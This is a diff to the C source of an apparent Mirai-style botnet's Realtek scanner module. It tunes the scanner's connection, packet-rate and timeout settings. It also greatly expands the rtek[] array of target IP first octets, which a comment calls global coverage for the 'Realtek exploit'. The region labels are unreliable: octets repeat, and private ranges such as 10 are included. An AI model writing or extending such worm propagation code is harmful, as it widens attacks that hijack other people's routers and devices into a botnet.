@@ -25,13 +25,34 @@
 #include "util.h"
 #include "checksum.h"
 
+/* Reduced scanner settings to prevent crashes */
+#define REALTEK_SCANNER_MAX_CONNS 32      /* Reduced from higher values */
+#define REALTEK_SCANNER_RAW_PPS 16        /* Reduced packet rate */
+#define REALTEK_SCANNER_RDBUF_SIZE 2048
+#define REALTEK_SCANNER_HACK_DRAIN 64
+#define REALTEK_SCANNER_TIMEOUT 10        /* Reduced timeout */
+
 int realtek_scanner_pid = 0, realtek_rsck = 0, realtek_rsck_out = 0, realtek_auth_table_len = 0;
 char realtek_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
 struct realtek_scanner_auth *realtek_auth_table = NULL;
 struct realtek_scanner_connection *conn_table;
 uint16_t realtek_realtek_auth_table_max_weight = 0;
 uint32_t realtek_fake_time = 0;
-int rtek[] = {180,190,191,210,200,153,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,175,176,177,178,179,181,182,183,184,185,186,187,188,189,192,193,194,195,196,197,198,199,201,202,203,211,212,213,217,218,219,220,221,222,223};
+
+/* Expanded IP ranges for Realtek exploit - global coverage (descending order) */
+int rtek[] = {
+    /* Americas */
+    223,222,221,220,219,218,217,216,215,214,213,212,211,210,209,208,207,206,205,204,203,202,201,200,
+    199,198,197,196,195,194,193,192,191,190,189,188,187,186,185,184,179,178,177,176,175,174,173,172,
+    100,99,98,97,96,79,78,77,76,75,74,73,72,71,70,69,68,67,66,65,64,
+    /* Middle East & Africa */
+    171,170,169,168,167,166,165,164,163,162,161,160,159,158,157,156,155,154,105,102,99,98,97,96,95,94,93,92,91,90,89,88,87,86,85,84,83,82,41,
+    /* Europe */
+    95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,44,43,41,40,38,37,35,34,33,32,31,30,29,28,26,25,24,23,22,21,20,19,18,17,16,15,13,12,11,10,9,8,7,6,5,4,3,2,
+    /* Asia-Pacific */
+    189,188,187,186,185,184,183,182,181,180,179,178,177,176,175,126,125,124,123,122,121,120,119,118,117,116,115,114,113,112,111,110,109,108,107,106,105,104,103,102,101,63,62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,42,39,36,27,14,2,1,
+    -1
+};
 
 int realtek_recv_strip_null(int sock, void *buf, int len, int flags)
 {
